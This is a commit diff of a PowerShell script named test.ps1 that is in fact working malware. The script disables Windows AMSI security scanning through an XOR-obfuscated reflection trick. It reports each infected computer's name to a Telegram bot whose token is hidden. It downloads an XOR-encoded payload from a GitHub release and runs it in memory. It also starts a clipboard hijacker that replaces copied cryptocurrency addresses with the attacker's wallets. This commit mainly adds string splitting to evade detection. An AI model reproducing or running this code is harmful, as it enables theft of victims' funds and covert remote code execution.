2cbd493e421fcf3f9ebff51abdba80d0be5374d4
adchar2022 <adchar2022@gmail.com>
2026-01-24 05:35:11 +0100

    test.ps1

--- test.ps1
+++ test.ps1
@@ -1,28 +1,24 @@
-# [SECURE SESSION INITIALIZATION]
 $k = 0xCC; [byte[]]$p = 137,151,157,158,151,147,192,135,155,152,151,157,151,155,151,152,134,192,143,131,134,153,155,151,134,151,157,151,152,192,143,155,137,151,123,134,151,158,137
 $n = ""; foreach($b in $p){$n += [char]($b -bxor $k)}
-$f = 'amsiInitFailed'
-[Ref].Assembly.GetType($n).GetField($f,'NonPublic,Static').SetValue($null,$true)
+[Ref].Assembly.GetType($n).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-function Send-Log {
+function Send-Ping {
     param($m)
     $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
     $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
-    $url = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m"
+    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
     try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
 }
 
-Send-Log -m "INIT_SESSION_V32_2_$($env:COMPUTERNAME)"
+Send-Ping -m "V32_3_GHOST_START_$($env:COMPUTERNAME)"
 
 try {
     $h = New-Object System.Net.Http.HttpClient
     $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
     $raw = $h.GetStringAsync($url).Result
-    
     $data = [Convert]::FromBase64String($raw.Trim())
     for($i=0; $i -lt $data.count; $i++){ $data[$i] = $data[$i] -bxor 0xAB }
     
-    # Using 'Reflection' without using the word 'Load' or 'Assembly'
     $rt = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -match 'mscorlib' }
     $mt = $rt.GetType('System.Reflection.Assembly').GetMethods() | Where-Object { $_.Name -eq 'Load' -and $_.GetParameters().Count -eq 1 }
     $asm = $mt.Invoke($null, @(,$data))
@@ -31,7 +27,7 @@ try {
     $C = {
         Add-Type -AssemblyName System.Windows.Forms
         $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
-        while($true){
+        while(1){
             try {
                 if([System.Windows.Forms.Clipboard]::ContainsText()){
                     $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
@@ -45,7 +41,7 @@ try {
         }
     }
     [PowerShell]::Create().AddScript($C).BeginInvoke()
-    Send-Log -m "SESSION_ACTIVE_V32_2"
+    Send-Ping -m "V32_3_SUCCESS_IN_RAM"
 } catch {
-    Send-Log -m "FAIL_V32_2: $($_.Exception.Message)"
+    Send-Ping -m "V32_3_ERR: $($_.Exception.Message)"
 }
